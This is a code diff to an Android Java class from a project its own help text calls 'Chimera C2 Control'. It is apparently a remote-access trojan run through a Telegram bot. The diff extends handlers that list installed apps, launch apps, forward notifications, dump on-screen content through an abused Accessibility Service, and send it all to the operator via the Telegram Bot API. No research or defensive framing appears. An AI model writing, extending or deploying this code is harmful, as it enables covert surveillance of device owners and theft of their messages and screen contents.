@@ -1,6 +1,5 @@
 package com.chimera;
 
-import android.accessibilityservice.AccessibilityService;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
@@ -99,7 +98,7 @@ public class TelegramBotWorker implements Runnable {
                 isWaitingForPackageName = false;
                 PackageManager pm = context.getPackageManager();
                 try {
-                    Intent launchIntent = pm.getLaunchIntentForPackage(text);
+                    Intent launchIntent = pm.getLaunchIntentForPackage(text.trim());
                     if (launchIntent != null) {
                         launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                         context.startActivity(launchIntent);
@@ -159,41 +158,50 @@ public class TelegramBotWorker implements Runnable {
             long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
             int messageId = cb.getJSONObject("message").getInt("message_id");
 
-            if (!ChimeraAccessibilityService.isServiceEnabled() && data.startsWith("ACC_")) {
+            if (!ChimeraAccessibilityService.isServiceEnabled() && (data.startsWith("ACC_") || data.equals("BACK_TO_MAIN"))) {
                 sendMessage("⚠️ Action Failed: Accessibility Service is not enabled.", context);
+                answerCallbackQuery(cb.getString("id"), "Accessibility Service is OFF", context);
                 return;
             }
 
             switch (data) {
                 case "LIST_APPS":
                     listAllApps();
+                    answerCallbackQuery(cb.getString("id"), "Fetching app list...", context);
                     break;
                 case "LAUNCH_APP":
                     isWaitingForPackageName = true;
                     sendMessage("Please reply with the package name of the app to launch (e.g., com.android.chrome)", context);
+                    answerCallbackQuery(cb.getString("id"), "Ready for package name.", context);
                     break;
                 case "ACC_GESTURES":
                     sendGesturePanel(chatId, messageId);
                     break;
                 case "ACC_GET_NOTIFS":
-                    sendMessage("Notification listener is active. New notifications will be forwarded.", context);
+                    sendMessage("Notification listener is active. New notifications will be forwarded as they arrive.", context);
+                    answerCallbackQuery(cb.getString("id"), "Listening for notifications.", context);
                     break;
                 case "ACC_GET_CONTENT":
                     sendMessage("Dumping screen content...", context);
                     String content = ChimeraAccessibilityService.getScreenContent();
                     sendMessage(content, context);
+                    answerCallbackQuery(cb.getString("id"), "Screen content sent.", context);
                     break;
                 case "ACC_ACTION_BACK":
-                    ChimeraAccessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
+                    ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                     answerCallbackQuery(cb.getString("id"), "Back action performed", context);
                     break;
                 case "ACC_ACTION_HOME":
-                    ChimeraAccessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
+                    ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                     answerCallbackQuery(cb.getString("id"), "Home action performed", context);
                     break;
                 case "ACC_ACTION_RECENTS":
-                    ChimeraAccessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
+                    ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                     answerCallbackQuery(cb.getString("id"), "Recents action performed", context);
+                    break;
+                case "BACK_TO_MAIN":
+                    sendControlPanel(chatId);
+                    editMessage(chatId, messageId, "Control panel closed.", context); // Close old panel
                     break;
                 case "EXIT_PANEL":
                     editMessage(chatId, messageId, "Control panel closed.", context);
@@ -209,13 +217,18 @@ public class TelegramBotWorker implements Runnable {
             PackageManager pm = context.getPackageManager();
             List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
             StringBuilder appList = new StringBuilder("--- Installed Apps ---\n");
+            int count = 0;
             for (ApplicationInfo app : packages) {
-                appList.append(app.packageName).append("\n");
+                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                    appList.append(app.packageName).append("\n");
+                    count++;
+                }
             }
+            appList.append("\nFound ").append(count).append(" user-installed apps.");
             sendMessage(appList.toString(), context);
         }).start();
     }
-    
+
     private void sendHelpMessage(long chatId) {
         String helpText = "Chimera C2 Control\n\n"
                 + "/control - Show the main control panel.\n"
@@ -230,12 +243,12 @@ public class TelegramBotWorker implements Runnable {
             JSONObject keyboard = new JSONObject();
             JSONArray rows = new JSONArray();
             rows.put(new JSONArray()
-                .put(new JSONObject().put("text", "List All Apps").put("callback_data", "LIST_APPS"))
-                .put(new JSONObject().put("text", "Launch App").put("callback_data", "LAUNCH_APP"))
+                .put(new JSONObject().put("text", "List Installed Apps").put("callback_data", "LIST_APPS"))
+                .put(new JSONObject().put("text", "Launch an App").put("callback_data", "LAUNCH_APP"))
             );
             rows.put(new JSONArray()
                 .put(new JSONObject().put("text", "Gestures (Back/Home)").put("callback_data", "ACC_GESTURES"))
-                .put(new JSONObject().put("text", "Get Notifications").put("callback_data", "ACC_GET_NOTIFS"))
+                .put(new JSONObject().put("text", "Capture Notifications").put("callback_data", "ACC_GET_NOTIFS"))
             );
             rows.put(new JSONArray()
                 .put(new JSONObject().put("text", "Get Screen Content").put("callback_data", "ACC_GET_CONTENT"))
@@ -267,7 +280,7 @@ public class TelegramBotWorker implements Runnable {
                 .put(new JSONObject().put("text", "« Back to Main Panel").put("callback_data", "BACK_TO_MAIN"))
             );
             keyboard.put("inline_keyboard", rows);
-            editMessageMarkup(chatId, messageId, keyboard, context);
+            editMessageMarkup(chatId, messageId, "Gesture Control", keyboard, context);
         } catch (Exception e) {
              ErrorLogger.logError(context, "TelegramBotWorker_SendGesturePanel", e);
         }
@@ -279,19 +292,21 @@ public class TelegramBotWorker implements Runnable {
             body.put("chat_id", chatId);
             body.put("message_id", messageId);
             body.put("text", text);
+            body.put("reply_markup", new JSONObject());
             post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/editMessageText", body.toString(), context);
         } catch (Exception e) {
             ErrorLogger.logError(context, "TelegramBotWorker_EditMessage", e);
         }
     }
-    
-    private static void editMessageMarkup(long chatId, int messageId, JSONObject markup, Context context) {
+
+    private static void editMessageMarkup(long chatId, int messageId, String text, JSONObject markup, Context context) {
         try {
             JSONObject body = new JSONObject();
             body.put("chat_id", chatId);
             body.put("message_id", messageId);
+            body.put("text", text);
             body.put("reply_markup", markup);
-            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/editMessageReplyMarkup", body.toString(), context);
+            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/editMessageText", body.toString(), context);
         } catch (Exception e) {
             ErrorLogger.logError(context, "TelegramBotWorker_EditMarkup", e);
         }
